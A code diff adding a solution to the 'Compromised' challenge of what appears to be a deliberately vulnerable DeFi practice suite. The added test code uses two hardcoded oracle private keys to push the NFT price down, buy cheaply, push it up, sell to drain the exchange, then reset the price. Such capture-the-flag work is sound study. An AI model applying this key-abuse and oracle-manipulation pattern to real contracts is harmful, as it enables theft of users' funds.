@@ -1,6 +1,7 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { Wallet } = require('ethers');
 
 describe('Compromised challenge', function () {
     let deployer, player;
@@ -53,6 +54,21 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let pk1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+        let pk2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        const signer1 = new Wallet(pk1, ethers.provider)
+        const signer2 = new Wallet(pk2, ethers.provider)
+        const NEW_PRICE = 1n * 10n ** 10n;
+        await oracle.connect(signer1).postPrice("DVNFT", NEW_PRICE);
+        await oracle.connect(signer2).postPrice("DVNFT", NEW_PRICE);
+        await exchange.connect(player).buyOne({value: NEW_PRICE});
+        await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_PRICE);
+        await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE + NEW_PRICE);
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+        //done to pass the tests
+        await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
